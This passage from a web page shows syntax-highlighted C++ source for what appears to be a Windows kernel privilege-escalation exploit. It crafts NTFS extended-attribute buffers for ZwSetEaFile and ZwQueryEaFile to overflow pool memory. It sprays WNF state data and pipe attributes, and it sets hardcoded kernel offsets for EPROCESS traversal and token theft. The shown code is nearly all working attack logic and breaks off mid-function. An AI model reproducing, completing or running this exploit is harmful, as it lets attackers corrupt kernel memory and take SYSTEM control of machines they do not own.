class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IO_STATUS_BLOCK</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        LONG Status;</span><br><span class="line">        PVOID Pointer;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG Information;</span><br><span class="line">&#125; IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_FILE_FULL_EA_INFORMATION</span> &#123;</span><br><span class="line">    ULONG  NextEntryOffset;</span><br><span class="line">    UCHAR  Flags;</span><br><span class="line">    UCHAR  EaNameLength;</span><br><span class="line">    USHORT EaValueLength;</span><br><span class="line">    CHAR   EaName[<span class="number">1</span>];</span><br><span class="line">&#125; FILE_FULL_EA_INFORMATION, * PFILE_FULL_EA_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_FILE_GET_EA_INFORMATION</span> &#123;</span><br><span class="line">    ULONG NextEntryOffset;</span><br><span class="line">    UCHAR EaNameLength;</span><br><span class="line">    CHAR  EaName[<span class="number">1</span>];</span><br><span class="line">&#125; FILE_GET_EA_INFORMATION, * PFILE_GET_EA_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PZwSetEaFile)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    IN HANDLE FileHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    OUT PIO_STATUS_BLOCK IoStatusBlock,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN PVOID Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN ULONG Length</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PZwQueryEaFile)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    IN HANDLE FileHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    OUT PIO_STATUS_BLOCK IoStatusBlock,</span></span></span><br><span class="line"><span class="params"><span class="function">    OUT PVOID Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN ULONG Length,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN BOOLEAN ReturnSingleEntry,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN PVOID EaList,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN ULONG EaListLength,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN PULONG EaIndex,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN BOOLEAN RestartScan</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WNF_STATE_NAME</span> &#123;</span><br><span class="line">    ULONG Data[<span class="number">2</span>];</span><br><span class="line">&#125; WNF_STATE_NAME, * PWNF_STATE_NAME;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">const</span> WNF_STATE_NAME* PCWNF_STATE_NAME;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">_WNF_STATE_NAME_LIFETIME</span> &#123;</span><br><span class="line">    WnfWellKnownStateName,</span><br><span class="line">    WnfPermanentStateName,</span><br><span class="line">    WnfPersistentStateName,</span><br><span class="line">    WnfTemporaryStateName</span><br><span class="line">&#125; WNF_STATE_NAME_LIFETIME;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">_WNF_STATE_NAME_INFORMATION</span> &#123;</span><br><span class="line">    WnfInfoStateNameExist,</span><br><span class="line">    WnfInfoSubscribersPresent,</span><br><span class="line">    WnfInfoIsQuiescent</span><br><span class="line">&#125; WNF_STATE_NAME_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">_WNF_DATA_SCOPE</span> &#123;</span><br><span class="line">    WnfDataScopeSystem,</span><br><span class="line">    WnfDataScopeSession,</span><br><span class="line">    WnfDataScopeUser,</span><br><span class="line">    WnfDataScopeProcess</span><br><span class="line">&#125; WNF_DATA_SCOPE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WNF_TYPE_ID</span> &#123;</span><br><span class="line">    GUID TypeId;</span><br><span class="line">&#125; WNF_TYPE_ID, * PWNF_TYPE_ID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">const</span> WNF_TYPE_ID* PCWNF_TYPE_ID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> ULONG WNF_CHANGE_STAMP, * PWNF_CHANGE_STAMP;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> ULONG LOGICAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WNF_STATE_DATA</span> &#123;</span><br><span class="line">    ULONG Header;</span><br><span class="line">    ULONG AllocatedSize;</span><br><span class="line">    ULONG DataSize;</span><br><span class="line">    ULONG ChangeStamp;</span><br><span class="line">&#125;WNF_STATE_DATA, * PWNF_STATE_DATA;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PZwCreateWnfStateName)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_ PWNF_STATE_NAME StateName,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ WNF_STATE_NAME_LIFETIME NameLifetime,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ WNF_DATA_SCOPE DataScope,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ BOOLEAN PersistData,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ PCWNF_TYPE_ID TypeId, <span class="comment">// This is an optional way to get type-safety</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ ULONG MaximumStateSize,<span class="comment">// Cannot be above 4KB</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor<span class="comment">// *MUST* be present</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PZwUpdateWnfStateData)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ PCWNF_STATE_NAME StateName,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_reads_bytes_opt_(Length) <span class="type">const</span> VOID* Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ ULONG Length, <span class="comment">// Must be less than MaximumSizewhen registered </span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ PCWNF_TYPE_ID TypeId, <span class="comment">// Optionally, for type-safety</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ <span class="type">const</span> PVOID ExplicitScope,<span class="comment">// Process handle, User SID, Session ID</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ WNF_CHANGE_STAMP MatchingChangeStamp,<span class="comment">// Expected current change stamp</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LOGICAL CheckStamp<span class="comment">// Enforce the above or silently ignore it</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PZwDeleteWnfStateData)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ PCWNF_STATE_NAME StateName,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ <span class="type">const</span> VOID* ExplicitScope</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PZwQueryWnfStateData)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ PCWNF_STATE_NAME StateName,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ PCWNF_TYPE_ID TypeId,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ <span class="type">const</span> VOID* ExplicitScope,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_ PWNF_CHANGE_STAMP ChangeStamp,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_writes_bytes_to_opt_(*BufferSize, *BufferSize) PVOID Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Inout_ PULONG BufferSize</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PIO_APC_ROUTINE)</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    IN PVOID ApcContext,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN PIO_STATUS_BLOCK IoStatusBlock, IN ULONG Reserved</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(WINAPI* PZwFsControlFile)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_      HANDLE           FileHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_  HANDLE           Event,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_  PIO_APC_ROUTINE  ApcRoutine,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_  PVOID            ApcContext,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_     PIO_STATUS_BLOCK IoStatusBlock,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_      ULONG            FsControlCode,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_  PVOID            InputBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_      ULONG            InputBufferLength,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ PVOID            OutputBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_      ULONG            OutputBufferLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_attribute</span>&#123;</span><br><span class="line">    LIST_ENTRY list;</span><br><span class="line">    <span class="type">char</span>* AttributeName;</span><br><span class="line">    __int64 ValueSize;</span><br><span class="line">    <span class="type">char</span>* AttributeValue;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">PipeHandles</span> &#123;</span><br><span class="line">    HANDLE readPipe;</span><br><span class="line">    HANDLE writePipe;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NT_SUCCESS(status) (status == (NTSTATUS)0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG                                   1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINT_BUFFER                            0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_PATH                               <span class="string">L&quot;test.txt&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EA_NAME1                                <span class="string">&quot;AAAAA&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EA_NAME2                                <span class="string">&quot;BBBBB&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EA_NAME_LEN1                            sizeof(EA_NAME1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EA_NAME_LEN2                            sizeof(EA_NAME2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPRAY_SIZE                              0xb000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOC_SIZE                              0xa0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POOL_HEADER_SIZE                        0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WNF_HEADER_SIZE                         0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TOTAL_WNF_SIZE                          (ALLOC_SIZE + POOL_HEADER_SIZE + WNF_HEADER_SIZE)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_WNF_SIZE                           (ALLOC_SIZE + TOTAL_WNF_SIZE * 2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_ATTRIBUTE_HEADER_SIZE              0x28</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_NAME_LEN                           0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_ATTRIBUTE_BUFFER_SIZE              (ALLOC_SIZE + WNF_HEADER_SIZE - PIPE_ATTRIBUTE_HEADER_SIZE)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NEXTPIPEATTRIBUTHEADEROFFSET            (ALLOC_SIZE + POOL_HEADER_SIZE)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_OBJECT_OFFSET                      0x110</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_OBJECT_OFFSET                    0x8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DRIVER_OBJECT_OFFSET                    0x8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAJOR_FUNCTION_OFFSET                   0x70</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOP_INVALID_DEVICE_REQUEST_OFFSET       0x38</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOP_INVALID_DEVICE_REQUEST_ADDR         0x140125D40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_WRITE_ROUNDS                       0x40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CREATE_TIME_OFFSET                      0x318</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROCESS_ID_OFFSET                       0x2e8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NEXT_EPROCESS_OFFSET                    0x2f0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TOKEN_OFFSET                            0x360                 </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printBuffer</span><span class="params">(PCHAR buffer, ULONG bufferSize)</span> </span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;\t[+] the buffer: &quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; bufferSize; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i % <span class="number">0x10</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        std::cout &lt;&lt; std::endl &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; std::hex &lt;&lt; ((ULONG)buffer[i]) % <span class="number">0x100</span> &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">HANDLE <span class="title">getFileHandle</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DEBUG</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;[+] getFileHandle &quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// DEBUG</span></span></span><br><span class="line"></span><br><span class="line">    HANDLE fileHandle = <span class="built_in">CreateFile</span>(FILE_PATH,</span><br><span class="line">        GENERIC_READ | GENERIC_WRITE | DELETE,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        OPEN_ALWAYS,</span><br><span class="line">        FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">        <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fileHandle == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">        DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to open: &quot;</span> &lt;&lt; err;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fileHandle;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setEaFile</span><span class="params">(HANDLE fileHandle, PCHAR pBuffer, USHORT size)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DEBUG</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;[+] setEaFile &quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// DEBUG</span></span></span><br><span class="line"></span><br><span class="line">    PZwSetEaFile ZwSetEaFile = (PZwSetEaFile)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;ZwSetEaFile&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ZwSetEaFile) &#123;</span><br><span class="line">        DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to get ZwSetEaFile : &quot;</span> &lt;&lt; err;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ULONG eaBlockSize1 = <span class="number">8</span> + EA_NAME_LEN1 + ALLOC_SIZE;</span><br><span class="line">    ULONG eaPaddingLen1 = ((eaBlockSize1 + <span class="number">3</span>) &amp; <span class="number">0xFFFFFFFC</span>) - eaBlockSize1;</span><br><span class="line">    ULONG ea1NextEntryOffset = eaBlockSize1 + eaPaddingLen1;</span><br><span class="line">    FILE_FULL_EA_INFORMATION ea1 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    ea1.NextEntryOffset = ea1NextEntryOffset;</span><br><span class="line">    ea1.Flags = <span class="number">0</span>;</span><br><span class="line">    ea1.EaNameLength = EA_NAME_LEN1 - <span class="number">1</span>;</span><br><span class="line">    ea1.EaValueLength = ALLOC_SIZE;</span><br><span class="line">    </span><br><span class="line">    ULONG eaBlockSize2 = <span class="number">8</span> + EA_NAME_LEN2 + size;</span><br><span class="line">    <span class="comment">//ULONG eaPaddingLen2 = ((eaBlockSize1 + 3) &amp; 0xFFFFFFFC) - eaBlockSize1;</span></span><br><span class="line">    FILE_FULL_EA_INFORMATION ea2 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    ea2.NextEntryOffset = <span class="number">0</span>;</span><br><span class="line">    ea2.Flags = <span class="number">0</span>;</span><br><span class="line">    ea2.EaNameLength = EA_NAME_LEN2 - <span class="number">1</span>;</span><br><span class="line">    ea2.EaValueLength = size;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    ULONG totalSize = eaBlockSize1 + eaPaddingLen1 + eaBlockSize2;</span><br><span class="line">    </span><br><span class="line">    PCHAR pSetEaBuffer = (PCHAR)<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, totalSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (pSetEaBuffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to pSetEaBuffer pBuffer&quot;</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(pSetEaBuffer, <span class="number">0</span>, totalSize);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(pSetEaBuffer, &amp;ea1, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(pSetEaBuffer + <span class="number">8</span>, &amp;EA_NAME1, EA_NAME_LEN1);</span><br><span class="line">    <span class="built_in">memset</span>(pSetEaBuffer + <span class="number">8</span> + EA_NAME_LEN1, <span class="number">0x61</span>, ALLOC_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(pSetEaBuffer + ea1NextEntryOffset, &amp;ea2, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(pSetEaBuffer + ea1NextEntryOffset + <span class="number">8</span>, &amp;EA_NAME2, EA_NAME_LEN2);</span><br><span class="line">    <span class="built_in">memcpy</span>(pSetEaBuffer + ea1NextEntryOffset + <span class="number">8</span> + EA_NAME_LEN2, pBuffer, size);</span><br><span class="line">    </span><br><span class="line">    IO_STATUS_BLOCK setEaIoStatusBlock = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    NTSTATUS status = <span class="built_in">ZwSetEaFile</span>(fileHandle, &amp;setEaIoStatusBlock, pSetEaBuffer, totalSize);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to ZwSetEaFile: &quot;</span> &lt;&lt; std::hex &lt;&lt; status;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">VirtualFree</span>(pSetEaBuffer, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">queryEaFile</span><span class="params">(HANDLE fileHandle)</span> </span>&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DEBUG</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;[+] queryEaFile &quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// DEBUG</span></span></span><br><span class="line"></span><br><span class="line">    PZwQueryEaFile ZwQueryEaFile = (PZwQueryEaFile)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;ZwQueryEaFile&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ZwQueryEaFile) &#123;</span><br><span class="line">        DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to get ZwQueryEaFile : &quot;</span> &lt;&lt; err;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ULONG eaBlockSize1 = <span class="number">5</span> + EA_NAME_LEN1;</span><br><span class="line">    ULONG eaPaddingLen1 = ((eaBlockSize1 + <span class="number">3</span>) &amp; <span class="number">0xFFFFFFFC</span>) - eaBlockSize1;</span><br><span class="line">    ULONG ea1NextEntryOffset = eaBlockSize1 + eaPaddingLen1;</span><br><span class="line">    FILE_GET_EA_INFORMATION ea1 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    ea1.NextEntryOffset = ea1NextEntryOffset;</span><br><span class="line">    ea1.EaNameLength = EA_NAME_LEN1 - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    ULONG eaBlockSize2 = <span class="number">5</span> + EA_NAME_LEN2;</span><br><span class="line">    ULONG eaPaddingLen2 = ((eaBlockSize2 + <span class="number">3</span>) &amp; <span class="number">0xFFFFFFFC</span>) - eaBlockSize1;</span><br><span class="line">    FILE_GET_EA_INFORMATION ea2 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    ea2.NextEntryOffset = <span class="number">0</span>;</span><br><span class="line">    ea2.EaNameLength = EA_NAME_LEN2 - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    ULONG totalSize = eaBlockSize1 + eaPaddingLen1 + eaBlockSize2 + eaPaddingLen2;</span><br><span class="line"></span><br><span class="line">    PCHAR pEaListBuffer = (PCHAR)<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, totalSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (pEaListBuffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to pEaListBuffer pBuffer&quot;</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(pEaListBuffer, <span class="number">0</span>, totalSize);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(pEaListBuffer, &amp;ea1, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(pEaListBuffer + <span class="number">5</span>, &amp;EA_NAME1, EA_NAME_LEN1);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(pEaListBuffer + ea1NextEntryOffset, &amp;ea2, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(pEaListBuffer + ea1NextEntryOffset + <span class="number">5</span>, &amp;EA_NAME2, EA_NAME_LEN2);</span><br><span class="line"></span><br><span class="line">    IO_STATUS_BLOCK queryEaIoStatusBlock = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    FILE_FULL_EA_INFORMATION queryEaBuffer = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    WORD queryEaBufferLen = <span class="number">8</span> + EA_NAME_LEN1 + ALLOC_SIZE;;</span><br><span class="line"></span><br><span class="line">    NTSTATUS status = <span class="built_in">ZwQueryEaFile</span>(fileHandle, &amp;queryEaIoStatusBlock, &amp;queryEaBuffer, queryEaBufferLen, <span class="number">0</span>, pEaListBuffer, totalSize, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span 